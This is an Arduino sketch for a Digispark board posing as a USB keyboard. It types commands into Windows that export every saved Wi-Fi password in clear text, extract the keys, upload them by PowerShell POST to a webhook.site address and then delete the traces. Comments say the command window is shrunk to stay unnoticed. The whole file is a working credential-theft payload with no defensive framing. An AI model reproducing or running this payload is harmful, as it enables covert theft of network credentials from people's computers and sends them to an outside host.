#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd &k mode con> cols=15 lines=1"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //Jumping to temporary dir
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key)clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.print("powershell Select/String /Path Wi}.xml /Pattern -keyMaterial- ");
  DigiKeyboard.sendKeyStroke(100, MOD_SHIFT_LEFT);
  DigiKeyboard.println("Wi/Fi/PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke/WebRequest /Uri https>&&webhook.site&ecbf0deb/cc97/4753/8d07/57e84ffbf05f /Method POST /InFile Wi/Fi/PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("del Wi/} &s &f &q"); //cleaning up all the mess
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
